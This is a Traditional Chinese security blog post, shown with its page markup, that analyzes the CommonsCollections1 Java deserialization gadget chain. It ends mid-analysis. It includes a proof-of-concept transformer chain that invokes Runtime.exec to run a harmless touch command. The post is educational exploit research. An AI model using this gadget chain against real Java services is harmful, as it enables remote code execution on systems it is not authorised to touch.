<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <meta http-equiv="X-UA-Compatible" content="IE=edge" >
  <title>Java 反序列化之 CommonCollections1 分析 | Kaibro&#39;s blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <!--<link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/earlyaccess/notosanstc.css">-->
  <meta name="description" content="前言Common Collections 反序列化漏洞歷史在上一篇文章中有稍微提過 這個漏洞在 2015 年時，對整個 Java 生態系造成不小的影響 後續也愈來愈多奇形怪狀的 Gadget chain 被大佬們一一挖出來 而本篇文章就以 ysoserial 中經典的 CommonCollections1 這條 Gadget chain 來做分析 雖然網路上類似本篇的分析文很多，但只看文章其實很難">
<meta name="keywords" content="Web,筆記,Java">
<meta property="og:type" content="article">
<meta property="og:title" content="Java 反序列化之 CommonCollections1 分析">
<meta property="og:url" content="http://blog.kaibro.tw/2020/02/27/Java反序列化之CommonCollections1分析/index.html">
<meta property="og:site_name" content="Kaibro&#39;s blog">
<meta property="og:description" content="前言Common Collections 反序列化漏洞歷史在上一篇文章中有稍微提過 這個漏洞在 2015 年時，對整個 Java 生態系造成不小的影響 後續也愈來愈多奇形怪狀的 Gadget chain 被大佬們一一挖出來 而本篇文章就以 ysoserial 中經典的 CommonCollections1 這條 Gadget chain 來做分析 雖然網路上類似本篇的分析文很多，但只看文章其實很難">
<meta property="og:updated_time" content="2020-03-04T14:20:08.481Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Java 反序列化之 CommonCollections1 分析">
<meta name="twitter:description" content="前言Common Collections 反序列化漏洞歷史在上一篇文章中有稍微提過 這個漏洞在 2015 年時，對整個 Java 生態系造成不小的影響 後續也愈來愈多奇形怪狀的 Gadget chain 被大佬們一一挖出來 而本篇文章就以 ysoserial 中經典的 CommonCollections1 這條 Gadget chain 來做分析 雖然網路上類似本篇的分析文很多，但只看文章其實很難">
  
    <link rel="alternative" href="/atom.xml" title="Kaibro&#39;s blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link rel="stylesheet" href="/css/style.css">
</head>

<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			
			<img src="/img/head.jpg" class="js-avatar">
			
		</a>

		<hgroup>
		  <h1 class="header-author"><a href="/">KaiBro</a></h1>
		</hgroup>

		

		
			<div class="switch-btn">
				<div class="icon">
					<div class="icon-ctn">
						<div class="icon-wrap icon-house" data-idx="0">
							<div class="birdhouse"></div>
							<div class="birdhouse_holes"></div>
						</div>
						<div class="icon-wrap icon-ribbon hide" data-idx="1">
							<div class="ribbon"></div>
						</div>
						
						
						<div class="icon-wrap icon-me hide" data-idx="3">
							<div class="user"></div>
							<div class="shoulder"></div>
						</div>
						
					</div>
					
				</div>
				<div class="tips-box hide">
					<div class="tips-arrow"></div>
					<ul class="tips-inner">
						<li>Menu</li>
						<li>標籤</li>
						
						
						<li>關於</li>
						
					</ul>
				</div>
			</div>
		

		<div class="switch-area">
			<div class="switch-wrap">
				<section class="switch-part switch-part1">
					<nav class="header-menu">
						<ul>
						
							<li><a href="/">主頁</a></li>
				        
							<li><a href="/archives">所有文章</a></li>
				        
							<li><a href="http://cv.kaibro.tw/">關於我</a></li>
				        
						</ul>
					</nav>
					<nav class="header-nav">
						<div class="social">
							
								<a class="github" target="_blank" href="https://github.com/w181496" title="github">github</a>
					        
								<a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
					        
								<a class="facebook" target="_blank" href="https://www.facebook.com/w181496" title="facebook">facebook</a>
					        
								<a class="twitter" target="_blank" href="https://twitter.com/KAIKAIBRO" title="twitter">twitter</a>
					        
						</div>
					</nav>
				</section>
				
				
				<section class="switch-part switch-part2">
					<div class="widget tagcloud" id="js-tagcloud">
						<a href="/tags/BugBounty/" style="font-size: 10px;">BugBounty</a> <a href="/tags/CTF/" style="font-size: 18.57px;">CTF</a> <a href="/tags/DEFCON/" style="font-size: 12.86px;">DEFCON</a> <a href="/tags/Java/" style="font-size: 12.86px;">Java</a> <a href="/tags/Linux/" style="font-size: 11.43px;">Linux</a> <a href="/tags/NCU/" style="font-size: 14.29px;">NCU</a> <a href="/tags/NTU/" style="font-size: 11.43px;">NTU</a> <a href="/tags/Pwn/" style="font-size: 15.71px;">Pwn</a> <a href="/tags/Web/" style="font-size: 17.14px;">Web</a> <a href="/tags/筆記/" style="font-size: 20px;">筆記</a> <a href="/tags/開箱/" style="font-size: 10px;">開箱</a> <a href="/tags/開箱文/" style="font-size: 10px;">開箱文</a>
					</div>
				</section>
				
				
				

				
				
				<section class="switch-part switch-part3">
				
					<div id="js-aboutme">Web security菜雞</div>
				</section>
				
			</div>
		</div>
	</header>				
</div>

    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
  	<div class="overlay">
  		<div class="slider-trigger"></div>
  		<h1 class="header-author js-mobile-header hide">KaiBro</h1>
  	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
			
				<img src="/img/head.jpg" class="js-avatar">
			
			</div>
			<hgroup>
			  <h1 class="header-author">KaiBro</h1>
			</hgroup>
			
			<nav class="header-menu">
				<ul>
				
					<li><a href="/">主頁</a></li>
		        
					<li><a href="/archives">所有文章</a></li>
		        
					<li><a href="http://cv.kaibro.tw/">關於我</a></li>
		        
		        <div class="clearfix"></div>
				</ul>
			</nav>
			<nav class="header-nav">
				<div class="social">
					
						<a class="github" target="_blank" href="https://github.com/w181496" title="github">github</a>
			        
						<a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
			        
						<a class="facebook" target="_blank" href="https://www.facebook.com/w181496" title="facebook">facebook</a>
			        
						<a class="twitter" target="_blank" href="https://twitter.com/KAIKAIBRO" title="twitter">twitter</a>
			        
				</div>
			</nav>
		</header>				
	</div>
</nav>

      <div class="body-wrap"><article id="post-Java反序列化之CommonCollections1分析" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2020/02/27/Java反序列化之CommonCollections1分析/" class="article-date">
  	<time datetime="2020-02-26T18:06:56.000Z" itemprop="datePublished">2020-02-27</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      Java 反序列化之 CommonCollections1 分析
    </h1>
  

      </header>
      
      <div class="article-info article-info-post">
        
	<div class="article-tag tagcloud">
		<i class="icon-price-tags icon"></i>
		<ul class="article-tag-list">
			 
        		<li class="article-tag-list-item">
        			<a href="tags/Web/" class="js-tag article-tag-list-link color4">Web</a>
        		</li>
      		 
        		<li class="article-tag-list-item">
        			<a href="tags/筆記/" class="js-tag article-tag-list-link color3">筆記</a>
        		</li>
      		 
        		<li class="article-tag-list-item">
        			<a href="tags/Java/" class="js-tag article-tag-list-link color5">Java</a>
        		</li>
      		
		</ul>
	</div>


        

        <div class="clearfix"></div>
      </div>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="u524D_u8A00"><a href="#u524D_u8A00" class="headerlink" title="前言"></a>前言</h2><p>Common Collections 反序列化漏洞歷史在<a href="https://blog.kaibro.tw/2020/02/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BreadObject%E5%88%86%E6%9E%90/">上一篇文章</a>中有稍微提過</p>
<p>這個漏洞在 2015 年時，對整個 Java 生態系造成不小的影響</p>
<p>後續也愈來愈多奇形怪狀的 Gadget chain 被大佬們一一挖出來</p>
<p>而本篇文章就以 ysoserial 中經典的 <a href="https://github.com/frohoff/ysoserial/blob/477ecb8f05f42b0195a67d9712e97f2c6d31e1da/src/main/java/ysoserial/payloads/CommonsCollections1.java" target="_blank" rel="external">CommonCollections1</a> 這條 Gadget chain 來做分析</p>
<p>雖然網路上類似本篇的分析文很多，但只看文章其實很難體會到 java gadget chain 裡頭的精髓</p>
<p>強烈建議大家有興趣、有時間的話，可以自己拉原始碼下來跟一遍，相信可以收穫更多 !</p>
<p>p.s. 這裡我分析的版本是 <a href="https://archive.apache.org/dist/commons/collections/source/commons-collections-3.1-src.zip" target="_blank" rel="external">Common Collections 3.1</a> 和 <a href="https://github.com/AdoptOpenJDK/openjdk-jdk8u" target="_blank" rel="external">JDK 8</a></p>
<a id="more"></a>
<p><br></p>
<h2 id="u7C21_u4ECB"><a href="#u7C21_u4ECB" class="headerlink" title="簡介"></a>簡介</h2><p><code>Apache Common Collections</code> 主要是一個用來擴充原生 Java Collection 的一個第三方 Library</p>
<p>(簡單說，就是一個擴充包的概念)</p>
<p>而 Collection 基本上就可以視為是 <code>Set</code>, <code>List</code>, <code>Queue</code> 等類別的抽象概念</p>
<p>所以 Common Collections 中提供了許多方式，能讓我們對這些 Collection 做操作</p>
<p>或是對各種資料結構做封裝、抽象化，簡化原本 JDK 中複雜的操作方式</p>
<p>例如後面會提到的各種 <code>Transformer</code>，最主要就是用來對這些 Collection 做內容轉換的</p>
<p>也因為它的方便性和實用性，所以許多框架預設都有引用這個 Library</p>
<p>導致一旦底層 Library 出問題，上面所有框架都會接連一起爆炸</p>
<p><br></p>
<h2 id="u5206_u6790"><a href="#u5206_u6790" class="headerlink" title="分析"></a>分析</h2><p>先從 <code>Transformer</code> 開始看:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// org.apache.commons.collections.Transformer</span></div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Transformer</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="comment">/**</span></div><div class="line">     * Transforms the input object (leaving it unchanged) into some output object.</div><div class="line">     *</div><div class="line">     * <span class="doctag">@param</span> input  the object to be transformed, should be left unchanged</div><div class="line">     * <span class="doctag">@return</span> a transformed object</div><div class="line">     * <span class="doctag">@throws</span> ClassCastException (runtime) if the input is the wrong class</div><div class="line">     * <span class="doctag">@throws</span> IllegalArgumentException (runtime) if the input is invalid</div><div class="line">     * <span class="doctag">@throws</span> FunctorException (runtime) if the transform cannot be completed</div><div class="line">     */</div><div class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span></span>;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>它是一個接口，主要用處就如同字面上的意思，是用來對輸入的物件做轉換</p>
<p>裡面最重要的就是 <code>transform()</code> 方法，我們後面會一直用到它!</p>
<p>接著來看幾個串 gadget chain 時會用到的 transformer 類別</p>
<p>一、 <code>ConstantTransformer</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConstantTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</div><div class="line">    ...</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> </span>&#123;</div><div class="line">        <span class="keyword">super</span>();</div><div class="line">        iConstant = constantToReturn;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</div><div class="line">        <span class="keyword">return</span> iConstant;</div><div class="line">    &#125;</div><div class="line">    ...</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>這個類別的 <code>transform()</code> 方法實作非常簡潔，直接吐回我們在呼叫 constructor 時設定的物件</p>
<p>也就是我們輸入的物件，沒有經過任何轉換操作就直接返回</p>
<p><br></p>
<p>二、 <code>InvokerTransformer</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InvokerTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</div><div class="line">    ...</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</div><div class="line">        <span class="keyword">super</span>();</div><div class="line">        iMethodName = methodName;</div><div class="line">        iParamTypes = paramTypes;</div><div class="line">        iArgs = args;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</div><div class="line">        <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</div><div class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            Class cls = input.getClass();</div><div class="line">            Method method = cls.getMethod(iMethodName, iParamTypes);</div><div class="line">            <span class="keyword">return</span> method.invoke(input, iArgs);</div><div class="line"></div><div class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</div><div class="line">            ...</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    ...</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><code>InvokerTransformer</code> 的 <code>transform()</code> 方法會透過反射，呼叫物件的方法</p>
<p>而值得注意的是，方法名、參數等都是我們在 constructor 中可控的，所以我們可以對輸入的 <code>input</code> 物件，做任意方法呼叫！</p>
<p><br></p>
<p>三、 <code>ChainedTransformer</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ChainedTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</div><div class="line">    ...</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> </span>&#123;</div><div class="line">        <span class="keyword">super</span>();</div><div class="line">        iTransformers = transformers;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</div><div class="line">            object = iTransformers[i].transform(object);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> object;</div><div class="line">    &#125;</div><div class="line">    ...</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><code>ChainedTransformer</code> 這個類別就有意思了，<code>iTransformers</code> 是一個 transformer 陣列，我們一樣可以透過 constructor 設定它</p>
<p>這裡 <code>transform()</code> 方法，會去對 <code>iTransformers</code> 中每一個 transformer 去呼叫其對應的 <code>transfomr()</code> 方法 !</p>
<p>也就是前一個 Transformer <code>transform()</code> 完的結果，會被當成下一個 Transformer <code>transform()</code> 的輸入</p>
<p>所以就能串成一個 transformer chain</p>
<p><br></p>
<p>到目前為止，這幾個 transformer 實際上組合一下，就已經能變成一個任意代碼執行了 !</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</div><div class="line">    Transformer[] transformer_arr = <span class="keyword">new</span> Transformer[] &#123;</div><div class="line">        <span class="keyword">new</span> ConstantTransformer(Runtime.class),</div><div class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</div><div class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</div><div class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[] &#123;String.class&#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">"/usr/bin/touch /tmp/rce"</span>&#125;)</div><div class="line">    &#125;;</div><div class="line">    Transformer chain = <span class="keyword">new</span> ChainedTransformer(transformer_arr);</div><div class="line">    chain.transform(chain);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>但只有這樣是不夠的</p>
<p>目前我們是手動建立 transformer，並手動呼叫 <code>ChainedTransformer.transform()</code> 方法來觸發整個 gadget chain</p>
<p>我們需要一個能夠自動去觸發 <code>transform()</code> 的方法</p>
<p><br></p>
<p>先來看 <code>TransformedMap</code> 這個類別 :</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line"> * Decorates another &lt;code&gt;Map&lt;/code&gt; to transform objects that are added.</div><div class="line"> * &lt;p&gt;</div><div class="line"> * The Map put methods and Map.Entry setValue method are affected by this class.</div><div class="line"> * Thus objects must be removed or searched for using their transformed form.</div><div class="line"> * For example, if the transformation converts Strings to Integers, you must</div><div class="line"> * use the Integer form to remove objects.</div><div class="line"> * &lt;p&gt;</div><div class="line"> * This class is Serializable from Commons Collections 3.1.</div><div class="line"> *</div><div class="line"> * <span class="doctag">@since</span> Commons Collections 3.0</div><div class="line"> * <span class="doctag">@version</span> $Revision: 1.11 $ $Date: 2004/06/07 22:14:42 $</div><div class="line"> *</div><div class="line"> * <span class="doctag">@author</span> Stephen Colebourne</div><div class="line"> */</div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TransformedMap</span></span></div><div class="line">        <span class="keyword">extends</span> <span class="title">AbstractInputCheckedMapDecorator</span></div><div class="line">        <span class="keyword">implements</span> <span class="title">Serializable</span> &#123;</div><div class="line"></div><div class="line">    <span class="comment">/** Serialization version */</span></div><div class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">7023152376788900464L</span>;</div><div class="line"></div><div class="line">    <span class="comment">/** The transformer to use for the key */</span></div><div class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Transformer keyTransformer;</div><div class="line">    <span class="comment">/** The transformer to use for the value */</span></div><div class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Transformer valueTransformer;</div><div class="line"></div><div class="line">    <span class="comment">/**</span></div><div class="line">     * Factory method to create a transforming map.</div><div class="line">     * &lt;p&gt;</div><div class="line">     * If there are any elements already in the map being decorated, they</div><div class="line">     * are NOT transformed.</div><div class="line">     *</div><div class="line">     * <span class="doctag">@param</span> map  the map to decorate, must not be null</div><div class="line">     * <span class="doctag">@param</span> keyTransformer  the transformer to use for key conversion, null means no conversion</div><div class="line">     * <span class="doctag">@param</span> valueTransformer  the transformer to use for value conversion, null means no conversion</div><div class="line">     * <span class="doctag">@throws</span> IllegalArgumentException if map is null</div><div class="line">     */</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">new</span> TransformedMap(map, keyTransformer, valueTransformer);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</div><div class="line">        <span class="keyword">super</span>(map);</div><div class="line">        <span class="keyword">this</span>.keyTransformer = keyTransformer;</div><div class="line">        <span class="keyword">this</span>.valueTransformer = valueTransformer;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    ...</div></pre></td></tr></table></figure>
<p>可以看到這邊的 <code>TransformedMap</code> 繼承了抽象類別 <code>AbstractInputCheckedMapDecorator</code></p>
<p>而 <code>AbstractInputCheckedMapDecorator</code> 又繼承了抽象類別 <code>AbstractMapDecorator</code></p>
<p>這個 <code>AbstractMapDecorator</code> 實際上實作了 JDK 的 <code>Map</code> interface</p>
<p>其中 <code>TransformedMap</code> 的 <code>keyTransformer</code> 和 <code>valueTransformer</code> 對應 key 跟 value 改變時要做的操作</p>
<p>當 key 或 value 被修改時，就會去調用對應 Transformer 的 <code>transform</code> 方法</p>
<p>有很多地方都能夠觸發 <code>keyTransformer.transform()</code> 或 <code>valueTransformer.transform()</code></p>
<p>但為了後面漏洞利用能繼續串另一個 class，我們這裡採用的是 <code>AbstractInputCheckedMapDecorator.entrySet()</code> 這條路去觸發</p>
<p><br></p>
<p>首先，<code>TransformedMap.decorate()</code> 會回傳一個 <code>TransformedMap</code></p>
<p>並且可以讓我們設定其中的 <code>keyTransformer</code> 和 <code>valueTransformer</code></p>
<p>所以這裡就能放我們前面串的那個 <code>ChainedTransformer</code> 當作 key 或 value 的 Transformer</p>
<p>接著我們看 <code>AbstractInputCheckedMapDecorator.entrySet()</code>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> Set <span class="title">entrySet</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span> (isSetValueChecking()) &#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">new</span> EntrySet(map.entrySet(), <span class="keyword">this</span>);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">return</span> map.entrySet();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">isSetValueChecking</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>當 <code>isSetValueChecking()</code> 條件成立時，會用到內部類別 <code>EntrySet</code>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">EntrySet</span> <span class="keyword">extends</span> <span class="title">AbstractSetDecorator</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">private</span> <span class="keyword">final</span> AbstractInputCheckedMapDecorator parent;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">EntrySet</span><span class="params">(Set set, AbstractInputCheckedMapDecorator parent)</span> </span>&#123;</div><div class="line">        <span class="keyword">super</span>(set);</div><div class="line">        <span class="keyword">this</span>.parent = parent;</div><div class="line">    &#125;</div><div class="line">    ...</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>接著我們繼續看 <code>AbstractInputCheckedMapDecorator$EntrySet</code> 的 <code>iterator()</code> 方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> Iterator <span class="title">iterator</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">new</span> EntrySetIterator(collection.iterator(), parent);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><code>iterator()</code> 方法又去建立了一個內部類別 <code>EntrySetIterator</code> 的實例</p>
<p><br></p>
<p>你可能想問: 這裡沒地方用到這些方法，為啥要看它們呢?</p>
<p>因為後面會有另一個 class 有同時用到這些東西，所以我們後面會再把這些一起串起來 !</p>
<p><br></p>
<p>繼續看 <code>AbstractInputCheckedMapDecorator$EntrySetIterator</code>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">EntrySetIterator</span> <span class="keyword">extends</span> <span class="title">AbstractIteratorDecorator</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="comment">/** The parent map */</span></div><div class="line">    <span class="keyword">private</span> <span class="keyword">final</span> AbstractInputCheckedMapDecorator parent;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">EntrySetIterator</span><span class="params">(Iterator iterator, AbstractInputCheckedMapDecorator parent)</span> </span>&#123;</div><div class="line">        <span class="keyword">super</span>(iterator);</div><div class="line">        <span class="keyword">this</span>.parent = parent;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">next</span><span class="params">()</span> </span>&#123;</div><div class="line">        Map.Entry entry = (Map.Entry) iterator.next();</div><div class="line">        <span class="keyword">return</span> <span class="keyword">new</span> MapEntry(entry, parent);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><code>next()</code> 方法透過 <code>iterator</code> 去取得 <code>Map.Entry</code> 物件</p>
<p>接著 new 了一個 <code>MapEntry</code> 實例返回</p>
<p>繼續看這個 <code>MapEntry</code>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MapEntry</span> <span class="keyword">extends</span> <span class="title">AbstractMapEntryDecorator</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="comment">/** The parent map */</span></div><div class="line">    <span class="keyword">private</span> <span class="keyword">final</span> AbstractInputCheckedMapDecorator parent;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">MapEntry</span><span class="params">(Map.Entry entry, AbstractInputCheckedMapDecorator parent)</span> </span>&#123;</div><div class="line">        <span class="keyword">super</span>(entry);</div><div class="line">        <span class="keyword">this</span>.parent = parent;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">setValue</span><span class="params">(Object value)</span> </span>&#123;</div><div class="line">        value = parent.checkSetValue(value);</div><div class="line">        <span class="keyword">return</span> entry.setValue(value);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>這裡關鍵是這個 <code>setValue()</code> 方法</p>
<p>可以看到它呼叫了 <code>parent.checkSetValue(value)</code></p>
<p>這個 <code>parent</code> 其實就是 <code>AbstractInputCheckedMapDecorator</code></p>
<p>而實作 <code>checkSetValue()</code> 方法是在 <code>TransformedMap.checkSetValue()</code> 這邊:</p>
